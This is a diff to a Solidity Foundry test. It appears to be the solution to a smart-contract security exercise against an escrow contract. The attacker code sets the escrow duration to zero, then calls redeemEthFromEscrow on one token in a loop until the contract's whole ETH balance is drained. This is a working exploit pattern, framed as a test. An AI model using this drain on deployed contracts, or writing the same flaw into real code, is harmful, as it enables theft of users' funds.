@@ -100,15 +100,13 @@ contract TestUR2 is Test {
 
         // SOLUTION - attack
         vm.startPrank(attacker);
-        escrow.escrowEth{value: TWO_ETH}(attacker, ONE_MONTH);
+        escrow.escrowEth{value: TWO_ETH}(attacker, 0);
         uint256 lastTokenId = escrowNft.tokenCounter();
-        // Fast forward to mature time
-        skip(ONE_MONTH);
+
         // Make sure the tokenId exists 
         uint256 balanceToSteal = address(escrow).balance; 
         uint256 iterations = balanceToSteal / TWO_ETH;
         for (uint256 i = 1; i <= iterations; i++) {
-            //console.log(i, escrowNft.amount(i));
             escrow.redeemEthFromEscrow(lastTokenId);
         }
         assertEq(address(escrow).balance, 0);
